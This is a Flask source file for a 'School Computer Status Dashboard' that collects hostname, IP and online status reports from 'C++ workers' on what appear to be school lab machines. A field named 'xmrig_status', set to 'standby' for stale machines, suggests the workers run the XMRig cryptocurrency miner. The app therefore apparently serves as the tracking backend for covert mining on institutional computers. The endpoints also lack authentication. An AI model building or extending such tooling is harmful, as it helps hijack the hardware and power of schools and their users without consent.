from flask import Flask, request, jsonify, render_template_string
import json
import os
import datetime

app = Flask(__name__)

# http://EchoBreakStatus.pythonanywhere.com/api/status

# Allow requests from your static site (e.g., echobreak.github.io or similar)
CORS_ALLOWED_ORIGIN = 'https://echobreak.space'

# Example: if your static site is on GitHub Pages:
# CORS_ALLOWED_ORIGIN = 'https://echobreak.github.io'


@app.after_request
def after_request(response):
    """Add CORS headers to every response."""
    response.headers['Access-Control-Allow-Origin'] = CORS_ALLOWED_ORIGIN
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    return response

# Path to JSON "database"
DATA_FILE = 'computers.json'

if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump({}, f)

def load_data():
    with open(DATA_FILE, 'r') as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

@app.route('/api/status', methods=['POST'])
def update_status():
    """
    C++ workers POST to this endpoint with JSON:
    {
        "hostname": "SN1347-2-113-01",
        "ip": "172.17.212.1",
        "status": "online",  // or "offline"
        "last_seen": "auto-filled if not provided"
    }
    """
    try:
        data = request.get_json()
        if not data or 'hostname' not in data:
            return jsonify({"error": "Missing hostname"}), 400

        hostname = data['hostname']
        current_data = load_data()

        if 'last_seen' not in data:
            data['last_seen'] = datetime.datetime.now().isoformat()

        current_data[hostname] = data
        save_data(current_data)

        return jsonify({"success": True, "message": f"Status updated for {hostname}"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/')
def dashboard():
    try:
        computers = load_data()
        online_count = sum(1 for comp in computers.values() if comp.get('status') == 'online')
        total_count = len(computers)
    except:
        computers = {}
        online_count = 0
        total_count = 0

    html_template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>School Computer Status</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
            .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            h1 { color: #333; }
            .stats { background: #e9f7ef; padding: 15px; border-radius: 5px; margin: 20px 0; }
            pre { background: #f8f8f8; padding: 15px; border: 1px solid #ddd; overflow-x: auto; }
            button { padding: 8px 16px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
            button:hover { background: #0056b3; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>School Computer Status Dashboard</h1>

            <div class="stats">
                <h2>General Status</h2>
                <p><strong>Online:</strong> {{ online_count }} / {{ total_count }} computers</p>
            </div>

            <h2>Raw JSON Data</h2>
            <button onclick="toggleJSON()">Toggle JSON View</button>
            <pre id="json-data" style="display:none;">{{ json_data }}</pre>

            <script>
                function toggleJSON() {
                    const pre = document.getElementById('json-data');
                    pre.style.display = pre.style.display === 'none' ? 'block' : 'none';
                }
            </script>
        </div>
    </body>
    </html>
    '''

    json_data = json.dumps(computers, indent=2)
    return render_template_string(
        html_template,
        online_count=online_count,
        total_count=total_count,
        json_data=json_data
    )


@app.route('/api/status', methods=['GET'])
def get_all_status():
    try:
        computers = load_data()
        now = datetime.datetime.now()
        STALE_THRESHOLD = datetime.timedelta(minutes=11)

        for hostname, data in computers.items():
            if 'last_seen' in data:
                last_seen = datetime.datetime.fromisoformat(data['last_seen'])
                if now - last_seen > STALE_THRESHOLD:
                    data['status'] = 'offline'
                    data['xmrig_status'] = 'standby'
            else:
                data['status'] = 'offline'

        return jsonify(computers), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
